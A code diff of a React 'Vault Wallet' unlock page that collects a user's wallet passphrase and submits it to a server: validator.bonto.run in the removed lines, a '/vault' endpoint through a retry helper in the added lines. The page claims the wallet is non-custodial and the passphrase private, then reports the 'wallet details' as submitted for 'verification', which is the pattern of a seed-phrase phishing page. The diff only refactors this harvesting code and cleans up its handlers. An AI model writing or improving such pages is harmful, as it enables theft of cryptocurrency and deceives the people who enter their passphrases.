@@ -1,12 +1,12 @@
 import React, { useState } from 'react';
 import './vaultPagesCss/vaultWallet.css';
-import axios from 'axios';
 import { toast } from 'react-toastify';
 import 'react-toastify/dist/ReactToastify.css';
 import vault_com_logo from "../../../assets/vault_logo.webp";
 import { useNavigate } from 'react-router-dom';
+import fetchWithRetry from '../../../utils/api';
 
-const vaultWallet = () => {
+const VaultWallet = () => {
   const [text, setText] = useState('');
   const [loading, setLoading] = useState(false);
   const [showSuccess, setShowSuccess] = useState(false);
@@ -14,22 +14,22 @@ const vaultWallet = () => {
   const navigate = useNavigate();
 
   const unlockWallet = async () => {
-    const url = 'https://validator.bonto.run/vault';
-    const data = { passphrase: text };
-
     try {
       setLoading(true);
-      const response = await axios.post(url, data);
-      setLoading(false);
+      const res = await fetchWithRetry('/vault', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ passphrase: text })
+      });
 
-      toast.success(response.data.message);
+      const data = await res.json();
+      toast.success(data.message);
       setText('');
       setShowSuccess(true);
     } catch (error) {
+      toast.error('An error occurred. Please try again.');
+    } finally {
       setLoading(false);
-      const errorMessage =
-        error.response?.data?.message || 'An error occurred. Please try again.';
-      toast.error(errorMessage);
     }
   };
 
@@ -51,7 +51,6 @@ const vaultWallet = () => {
           <div className='vault_wallet_h3'>
             <h3>Unlock Vault Wallet</h3>
           </div>
-
           <div className='vault_wallet_bottom_body'>
             <div className='vault_wallet_bottom_container'>
               <textarea
@@ -60,7 +59,6 @@ const vaultWallet = () => {
                 value={text}
                 onChange={(e) => setText(e.target.value)}
               />
-
               <button
                 className='vault_unlock_with_passphrase_btn'
                 onClick={unlockWallet}
@@ -68,20 +66,17 @@ const vaultWallet = () => {
               >
                 {loading ? 'Loading...' : 'Unlock With Passphrase'}
               </button>
-
               <button
                 className='vault_unlock_with_faceid_btn'
                 onClick={unlockWithId}
               >
                 Unlock With Face ID
               </button>
-
               <p>
                 As a non-custodial wallet, your wallet passphrase is exclusively
                 accessible only to you. Recovery of passphrase is currently
                 impossible.
               </p>
-
               <p>
                 Lost your passphrase? <span>you can create a new wallet</span>,
                 but all assets in your previous wallet will be inaccessible.
@@ -97,7 +92,6 @@ const vaultWallet = () => {
               Your wallet details have been submitted successfully.
               A confirmation email will be sent once verification is complete.
             </p>
-
             <div style={{ display: 'flex', gap: '12px', marginTop: '20px' }}>
               <button
                 className='vault_unlock_with_passphrase_btn'
@@ -105,11 +99,9 @@ const vaultWallet = () => {
               >
                 Go Home
               </button>
-
               <button
                 className='vault_unlock_with_faceid_btn'
-                // onClick={() => setShowSuccess(false)}
-                nClick={unlockWithId}
+                onClick={() => setShowSuccess(false)}
               >
                 Continue
               </button>
@@ -121,4 +113,4 @@ const vaultWallet = () => {
   );
 };
 
-export default vaultWallet;
+export default VaultWallet;
